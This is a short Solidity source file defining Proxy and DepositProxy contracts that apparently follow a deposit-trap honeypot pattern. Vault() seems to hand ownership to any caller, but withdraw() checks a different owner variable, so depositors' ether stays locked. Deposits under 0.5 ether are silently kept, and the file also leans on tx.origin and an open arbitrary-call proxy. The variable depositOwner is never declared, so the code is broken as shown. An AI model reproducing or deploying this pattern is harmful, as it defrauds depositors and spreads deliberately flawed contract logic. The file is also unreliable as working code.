pragma solidity ^0.4.24;

contract Proxy  {
    modifier onlyOwner { if (msg.sender == proxyOwner) _; } address proxyOwner = msg.sender;
    function transferOwner(address _owner) public onlyOwner { proxyOwner = _owner; } 
    function proxy(address target, bytes data) public payable {
        target.call.value(msg.value)(data);
    }
}

contract DepositProxy is Proxy {
    mapping (address => uint256) private deposits;

    function () public payable { }
    
    function Vault() public payable {
        if (msg.sender == tx.origin) {
            depositOwner = msg.sender;
            deposit();
        }
    }
    
    function deposit() public payable {
        if (msg.value > 0.5 ether) {
            deposits[msg.sender] += msg.value;
        }
    }
    
    function withdraw(uint256 amount) public onlyOwner {
        if (amount>0 && deposits[msg.sender]>=amount) {
            msg.sender.transfer(amount);
        }
    }
}